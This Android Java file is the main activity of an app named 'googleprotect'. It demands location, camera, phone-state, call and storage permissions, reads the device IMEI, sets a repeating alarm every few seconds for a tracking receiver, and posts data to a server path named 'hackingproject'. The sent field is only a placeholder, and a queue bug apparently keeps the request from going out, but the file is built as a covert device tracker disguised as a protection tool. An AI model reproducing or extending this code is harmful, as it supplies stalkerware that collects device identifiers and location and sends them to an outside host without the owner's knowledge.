package com.baba.googleprotect;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

import static android.Manifest.permission.ACCESS_COARSE_LOCATION;
import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.ACCESS_NETWORK_STATE;
import static android.Manifest.permission.CALL_PHONE;
import static android.Manifest.permission.CAMERA;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

public class MainActivity extends AppCompatActivity {

    private Button send;
    private RequestQueue mQueue;
    private RequestQueue vQueue;
    private String employeeId,device_id;
    private static final int PERMISSION_REQUEST_CODE = 200;
    private Context context;
    Calendar calendar;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mQueue = Volley.newRequestQueue(getApplicationContext());
        vQueue = Volley.newRequestQueue(getApplicationContext());
        send=findViewById(R.id.send);
        calendar = Calendar.getInstance();
        // here we are calling
        setAlarm(calendar.getTimeInMillis());

        if (!checkPermission()) {

            requestPermission();

        } else {

            // here we are getting imeino
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                //getDeviceId() is Deprecated so for android O we can use getImei() method
                device_id = tm.getImei();
            } else {
                device_id = tm.getDeviceId();
            }

            jsonParse();
        }



    }






    private void requestPermission () {

        ActivityCompat.requestPermissions(this, new String[]{ACCESS_FINE_LOCATION, CAMERA, ACCESS_COARSE_LOCATION, CALL_PHONE, READ_PHONE_STATE, WRITE_EXTERNAL_STORAGE, ACCESS_NETWORK_STATE}, PERMISSION_REQUEST_CODE);

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;
                    boolean locationCoarseAccepted = grantResults[2] == PackageManager.PERMISSION_GRANTED;
                    boolean callPhone = grantResults[3] == PackageManager.PERMISSION_GRANTED;
                    boolean readPhoneState = grantResults[4] == PackageManager.PERMISSION_GRANTED;
                    boolean writeExternalStorage = grantResults[5] == PackageManager.PERMISSION_GRANTED;
                    boolean networkState=grantResults[6] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted&&locationCoarseAccepted&&callPhone&&readPhoneState&&writeExternalStorage&&networkState) {


                        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

                        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                            // TODO: Consider calling
                            // requestPermission();
                            //    ActivityCompat#requestPermissions
                            // here to request the missing permissions, and then overriding
                            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                            //                                          int[] grantResults)
                            // to handle the case where the user grants the permission. See the documentation
                            // for ActivityCompat#requestPermissions for more details.
                            return;
                        }


                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            //getDeviceId() is Deprecated so for android O we can use getImei() method
                            device_id= tm.getImei();
                        }
                        else {
                            device_id= tm.getDeviceId();
                        }


                        //    Toast.makeText(getApplicationContext(),device_id,Toast.LENGTH_LONG).show();

                        if(device_id!=null&&employeeId!=null)
                        {
                            jsonParse();
                        }
                        //   Toast.makeText(getApplicationContext(), "Permission Granted, Now you can access location data and camera.", Toast.LENGTH_LONG).show();

                    }

                    else {
                        //  Toast.makeText(getApplicationContext(), "Permission Denied, You cannot access location data and camera.", Toast.LENGTH_LONG).show();


                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(ACCESS_FINE_LOCATION)) {
                                showMessageOKCancel("You need to allow all  permissions",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface dialog, int which) {
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{ACCESS_FINE_LOCATION, CAMERA,ACCESS_COARSE_LOCATION,CALL_PHONE,READ_PHONE_STATE,WRITE_EXTERNAL_STORAGE,ACCESS_NETWORK_STATE},
                                                            PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });
                                return;
                            }
                        }

                    }
                }


                break;
        }
    }

    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
        new AlertDialog.Builder(MainActivity.this)
                .setMessage(message)
                .setPositiveButton("OK", okListener)
                .setNegativeButton("Cancel", null)
                .create()
                .show();
    }


    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), ACCESS_FINE_LOCATION);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), CAMERA);
        int result2 = ContextCompat.checkSelfPermission(getApplicationContext(), ACCESS_COARSE_LOCATION);
        int result3 = ContextCompat.checkSelfPermission(getApplicationContext(), CALL_PHONE);
        int result4 = ContextCompat.checkSelfPermission(getApplicationContext(), READ_PHONE_STATE);
        int result5 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_EXTERNAL_STORAGE);
        int result6 = ContextCompat.checkSelfPermission(getApplicationContext(), ACCESS_NETWORK_STATE);

        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED&& result2 == PackageManager.PERMISSION_GRANTED&& result3 == PackageManager.PERMISSION_GRANTED
                && result4 == PackageManager.PERMISSION_GRANTED&& result5 == PackageManager.PERMISSION_GRANTED&& result6 == PackageManager.PERMISSION_GRANTED;
    }






    private void jsonParse() {



        String url = "https://www.play4deal.com/hackingproject/testmail.php";

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        Toast.makeText(getApplicationContext(),response,Toast.LENGTH_LONG).show();

                    }

                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.i("error",error+"");
            }
        }) {
            //adding parameters to the request
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("latitude", "Hello-world");
             ;
                return params;
            }
        };


        if (mQueue == null) {
            mQueue = Volley.newRequestQueue(getApplicationContext());
            mQueue.add(stringRequest);
            // Build.logError("Setting a new request queue");
        }
        // stringRequest.setRetryPolicy(new DefaultRetryPolicy(DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

    }

    private void setAlarm(long time) {
        //getting the alarm manager
        AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
      //  Log.i("alarm","stilltrigerring");
        // 6000 == 1 mins
        int interval = 3000;
        //creating a new intent specifying the broadcast receiver
        Intent i = new Intent(getApplicationContext(), TrackReciever.class);
        //creating a pending intent using the intent
        PendingIntent pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, i, 0);
        //setting the repeating alarm that will be fired every day
        manager.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), interval, pendingIntent);
        //Toast.makeText(getContext(), "Alarm Set", Toast.LENGTH_SHORT).show();

    }




}
